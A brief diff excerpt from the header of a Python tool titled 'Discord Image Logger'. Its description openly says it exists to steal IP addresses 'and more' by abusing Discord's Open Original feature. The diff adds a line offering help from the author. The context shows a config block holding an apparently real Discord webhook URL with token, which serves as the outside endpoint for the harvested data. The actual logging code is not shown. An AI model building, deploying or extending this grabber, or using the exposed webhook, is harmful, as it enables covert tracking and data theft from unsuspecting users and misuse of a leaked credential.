@@ -9,7 +9,7 @@ __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "i_hate_everyone121(on discord)"
-
+(if u need any help just dm me on discord my discord is the one above)
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1401517818545176678/qW6F_1r5YiYYw-4PAakmhUHNJtRMqZbufZBbhL8q_e9vYdM-Z_t9gz-AlbZQ_z3Nf6kS",
